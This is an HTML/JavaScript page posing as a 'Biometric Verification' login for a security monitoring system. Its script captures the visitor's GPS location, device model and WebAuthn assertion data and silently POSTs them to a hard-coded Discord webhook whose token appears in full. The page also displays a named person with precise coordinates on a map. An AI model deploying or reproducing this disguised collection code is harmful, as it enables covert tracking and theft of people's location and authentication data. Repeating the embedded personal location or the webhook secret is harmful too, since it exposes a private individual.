<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OMX</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <style>
        /* Enhanced Auth Overlay */
        .auth-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #0a0a2a 0%, #001015 100%);
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 1;
            transition: all 0.5s ease-in-out;
        }

        .auth-overlay.fade-out {
            opacity: 0;
            transform: scale(1.1);
        }

        .auth-box {
            background: rgba(10, 20, 30, 0.95);
            padding: 2.5rem;
            border-radius: 20px;
            width: 320px;
            text-align: center;
            border: 1px solid rgba(0, 255, 136, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            transform: translateY(0);
            transition: all 0.3s ease;
        }

        /* Enhanced Biometric Interface */
        .bio-prompt {
            position: relative;
            padding: 2rem;
        }

        .bio-icon {
            width: 80px;
            height: 80px;
            background: rgba(0, 255, 136, 0.1);
            border-radius: 50%;
            margin: 0 auto 1.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        /* Pinpoint Styles */
        .precision-marker {
            position: relative;
            width: 24px;
            height: 24px;
            z-index: 500;
        }

        .pulse-core {
            width: 12px;
            height: 12px;
            background: #00ff88;
            border-radius: 50%;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(0,255,136,0.4); }
            70% { box-shadow: 0 0 0 12px rgba(0,255,136,0); }
            100% { box-shadow: 0 0 0 0 rgba(0,255,136,0); }
        }

        /* Enhanced Transitions */
    /* Modified Status Panel */
    .status-panel {
        position: fixed;
        top: 20px;
        left: 20px;
        background: rgba(10, 20, 30, 0.97);
        border-radius: 8px;
        padding: 16px;
        color: #fff;
        width: 280px;
        box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        border: 1px solid rgba(255,255,255,0.1);
        z-index: 2000; /* Increased z-index */
        backdrop-filter: blur(5px);
        display: none;
    }

        .status-panel.show {
            opacity: 1;
            transform: translateY(0);
        }

    #map {
        height: 100vh;
        width: 100%;
        position: relative;
        z-index: 1; /* Lower than status panel */
        background: #262626;
        opacity: 0;
        transition: opacity 0.5s ease-out 0.4s;
    }

        #map.show {
            opacity: 1;
        }

        /* Original Styles */
        body {
            margin: 0;
            overflow: hidden;
            background: #0a0a0a;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }

        .status-panel {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(10, 20, 30, 0.97);
            border-radius: 8px;
            padding: 16px;
            color: #fff;
            width: 280px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.1);
            z-index: 1000;
            backdrop-filter: blur(5px);
            display: none;
        }

        .icon {
            width: 20px;
            height: 20px;
            vertical-align: middle;
            margin-right: 8px;
        }
    </style>
</head>
<body>
    <!-- Biometric Interface -->
    <div id="authOverlay" class="auth-overlay">
        <div class="auth-box">
            <div class="bio-prompt">
                <div class="bio-icon">
                    <div class="pulse-core"></div>
                </div>
                <h2 style="color: #00ff88; margin-bottom: 1rem; font-size: 1.5rem;">
                    Biometric Verification
                </h2>
                <p style="color: #88aabb; margin-bottom: 2rem;">
                    Please authenticate to access the security system
                </p>
                <div id="bioStatus" style="color: #ff5555; margin: 1rem 0; min-height: 20px;"></div>
            </div>
        </div>
    </div>

    <!-- Monitoring Interface -->
    <div class="status-panel">
        <div class="user-info">
            <div class="user-avatar">
                <svg class="icon" viewBox="0 0 24 24" fill="#00ff88">
                    <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm3 8h-2v2h2v2h-2v2h-2v-2H9v-2h2V8H9V6h2V4h2v2h2v2z"/>
                </svg>
            </div>
            <div>
                <div id="user-greeting">Hello Maïssa Aamri</div>
                <div style="font-size: 0.9em; color: #8899aa;">
                    <svg class="icon" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
                    </svg>
                    Schaffhausen, CH
                </div>
            </div>
        </div>

        <div class="system-status">
            <div class="status-item">
                <span>Coordinates:</span>
                <span>47.53072°N, 8.72342°E</span>
            </div>
            <div class="status-item">
                <span>Accuracy:</span>
                <span>± 3 meters</span>
            </div>
            <div class="status-item">
                <span>Last Update:</span>
                <span id="current-time"></span>
            </div>
            <div class="status-item">
                <span>Device:</span>
                <span id="device-model"></span>
            </div>
        </div>
    </div>

    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // INSECURE CONFIGURATION
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1318278242376880198/y-7-4Q-mDyviifE-pyDPPHellv5-kQlUpTyp8e5it2_a4K3N1XF0vwZ-4TVgyrnlgWl8';
    
        // ======================
        // DEVICE VERIFICATION
        // ======================
        const ua = navigator.userAgent;
        const isAuthorizedDevice = 
            /iPhone(12,3|13,3)|(12\s*Pro|12PRO)/i.test(ua) || 
            /CPU iPhone OS 16_7_10/.test(ua);
    
        let deviceModel = 'Unauthorized';
        if (/iPhone(12,3|13,3)/i.test(ua)) deviceModel = 'iPhone 12 Pro';
        else if (/CPU iPhone OS 16_7_10/.test(ua)) deviceModel = 'iPhone (iOS 16.7.10)';
    
        // ======================
        // CORE SYSTEM
        // ======================
        (async function init() {
            // Initial checks
            if (!isAuthorizedDevice) return showDeviceError();
            if (!window.isSecureContext) return showBioError('HTTPS Required');
            
            try {
                document.getElementById('device-model').textContent = `${deviceModel} ✔️`;
                
                // Biometric setup
                if (!await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()) {
                    return showBioError('Biometrics Unavailable');
                }
                
                if (!localStorage.getItem('bioCredential')) await registerBiometric();
                await authenticateBiometric();
                showMonitoringInterface();
                
            } catch(error) {
                showBioError('System Failure');
                console.error('Core Error:', error);
            }
        })();
    
        // ======================
        // BIOMETRIC FUNCTIONS
        // ======================
        async function registerBiometric() {
            const challenge = crypto.getRandomValues(new Uint8Array(32));
            const publicKey = {
                rp: { name: "System", id: location.hostname },
                user: {
                    id: crypto.getRandomValues(new Uint8Array(16)),
                    name: "admin0mrx",
                    displayName: "OMX"
                },
                challenge: challenge,
                pubKeyCredParams: [{ type: "public-key", alg: -7 }],
                authenticatorSelection: {
                    authenticatorAttachment: "platform",
                    userVerification: "required",
                    residentKey: "required"
                },
                timeout: 60000
            };
    
            const credential = await navigator.credentials.create({ publicKey });
            localStorage.setItem('bioCredential', JSON.stringify({
                id: credential.id,
                rawId: Array.from(new Uint8Array(credential.rawId)),
                transports: ["internal"]
            }));
        }
    
        async function authenticateBiometric() {
            const storedCred = JSON.parse(localStorage.getItem('bioCredential'));
            const challenge = crypto.getRandomValues(new Uint8Array(32));
    
            const assertion = await navigator.credentials.get({
                publicKey: {
                    challenge: challenge,
                    rpId: location.hostname,
                    allowCredentials: [{
                        type: "public-key",
                        id: new Uint8Array(storedCred.rawId),
                        transports: ["internal"]
                    }],
                    userVerification: "required",
                    timeout: 60000
                }
            });
    
            // INSECURE DATA TRANSMISSION
            const bioPayload = {
                id: assertion.id,
                clientData: arrayToBase64(assertion.response.clientDataJSON),
                authData: arrayToBase64(assertion.response.authenticatorData),
                signature: arrayToBase64(assertion.response.signature),
                location: await getLocation(),
                device: deviceModel
            };
    
            // VULNERABLE WEBHOOK CALL
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: '🔐 Biometric Data Capture',
                    embeds: [{
                        title: "Security Alert",
                        fields: [
                            {name: "Device", value: bioPayload.device},
                            {name: "Location", value: bioPayload.location},
                            {name: "Client Data", value: `\`${bioPayload.clientData}\``},
                            {name: "Auth Signature", value: `\`${bioPayload.signature.slice(0,24)}...\``}
                        ]
                    }]
                })
            });
        }
    
        // ======================
        // UTILITIES
        // ======================
        function arrayToBase64(buffer) {
            return btoa(String.fromCharCode(...new Uint8Array(buffer)));
        }
    
        async function getLocation() {
            try {
                const pos = await new Promise((res, rej) => 
                    navigator.geolocation.getCurrentPosition(res, rej, {timeout:5000}));
                return `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
            } catch {
                return 'Location Unknown';
            }
        }
    
        function showMonitoringInterface() {
            document.getElementById('authOverlay').style.display = 'none';
            initializeMap();
            setInterval(() => {
                document.getElementById('current-time').textContent = 
                    new Date().toLocaleTimeString('en-GB');
            }, 1000);
        }
    
        function initializeMap() {
            const map = L.map('map').setView([47.53072, 8.72342], 17);
            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
            L.marker([47.53072, 8.72342], {
                icon: L.divIcon({className: 'marker', html: '<div class="pulse"></div>'})
            }).addTo(map);
        }
    
        function showBioError(msg) {
            document.getElementById('bioStatus').textContent = msg;
        }
    
        function showDeviceError() {
            document.body.innerHTML = `
                <div class="error-screen">
                    <h2>⚠️ Device Not Authorized</h2>
                    <p>Detected: ${ua.match(/iPhone|CPU OS/)?.join(' ') || 'Unknown'}</p>
                </div>
            `;
        }
    </script>
</body>
</html>
